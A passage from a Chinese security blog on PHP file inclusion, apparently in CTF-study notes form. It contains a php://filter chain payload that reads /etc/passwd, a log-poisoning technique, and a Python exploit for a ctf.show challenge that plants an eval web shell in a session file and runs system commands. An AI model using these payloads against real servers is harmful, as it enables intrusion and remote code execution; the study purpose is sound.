+<p>同时也可以通过php:&#x2F;&#x2F;filter生成图片头信息,绕过检测<br><a target="_blank" rel="noopener" href="https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91">https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91</a></p>
+<p><code>filter-chain</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</span><br></code></pre></td></tr></table></figure>
+<h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><ol>
+<li>包含服务器框架日志</li>
+</ol>
+<p>需要绝对路径,日志文件名,位置可知.</p>
+<p>首先获取服务器根目录，<br>包含<code>/proc/8/cmdline</code>获得<code>WorkerMan: master process start_file=/var/www/html/webrooth1xaa/start.php</code>,结合本地的start.php位置可知,根目录为&#x2F;var&#x2F;www&#x2F;html&#x2F;webrooth1xaa</p>
+<p>包含<code>&lt;?php ... ?&gt;</code>,将产生<code>include &lt;?php ... ?&gt;</code>错误,写入日志文件中,再包含日志文件</p>
+<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>题目<a target="_blank" rel="noopener" href="https://ctf.show/challenges#easy_include-4260">easy_include</a></p>
+<p>考点一:<br>file伪协议除了通过<code>file:///&lt;PATH&gt;</code>访问，也可以通过<code>file://localhost/&lt;PATH&gt;</code>访问<br>理论上可以通过<code>file://&lt;IP&gt;/&lt;PATH&gt;</code>访问, 但可能实际上不被允许, 只有<code>file://127.0.0.1/&lt;PATH&gt;</code>可行</p>
+<p>考点二:<br>文件包含</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;localhost/tmp/sess_aaa&#x27;</span>, <span class="hljs-comment"># include file://localhost/tmp/sess_aaa</span><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;ls /&quot;);&#x27;</span> <br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;fakeFile&#x27;</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: <span class="hljs-string">&#x27;aaa&#x27;</span><br>&#125;<br>response = requests.post(url=url, data=data, files=file, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>
+<p>最终session文件中内容为 <code>...upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;...</code></p>
+<p>配置要求：<br><strong>session.upload_progress.enabled &#x3D; on</strong><br><strong>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”</strong> (默认值)<br>session.use_strict_mode &#x3D; 0 (默认值)  || session.auto_start &#x3D; 1 (非默认值) || 代码中执行session_start() || 都不满足好像也可以。。。<br>session.upload_progress.cleanup &#x3D; off (默认开启，否则需要进行条件竞争)<br>session.upload_progress.prefix &#x3D; “upload_progress_” (不重要)</p>
+<p>原理：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/288430.html">文章 :)</a></p>
+<p>当session.use_strict_mode &#x3D; 0时可以手动设置Cookie中的PHPSESSID，从而达到自定义文件名的效果, 此时必须手动设置PHPSESSID，否则不会生成session文件<br>当session.use_strict_mode &#x3D; 1时，依赖与服务器自动创建session文件(上传文件时)，在手动随机设置PHPSESSID后，响应中会返回PHPSESSID的值<br>当上传一个文件时，若session.upload_progress.enabled &#x3D; on 指示跟踪文件上传过程信息，session.upload_progress.name指示从哪个(POST)变量中获取并写入信息，session.upload_progress.prefix指示写入的信息的前缀</p>
+<p>如果session.use_strict_mode &#x3D; 0 &amp;&amp; session.upload_progress.cleanup &#x3D; on时，需要从响应中获取PHPSESSID，但是等你获取到了PHPSESSID，session文件已经被清空了，这时就不能成功包含session文件</p>
+<p><strong>session文件路径</strong><br>常见路径：<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>配置：<br>session.save_path</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/php/" class="category-chain-item">php</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php文件包含漏洞</div>
+      <div>http://mekrina.github.io/blogs/php/php文件包含漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/blogs/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blogs/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化">
+                        <span class="hidden-mobile">pickle反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/blogs/js/events.js" ></script>
+<script  src="/blogs/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/blogs/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/blogs/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/blogs/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
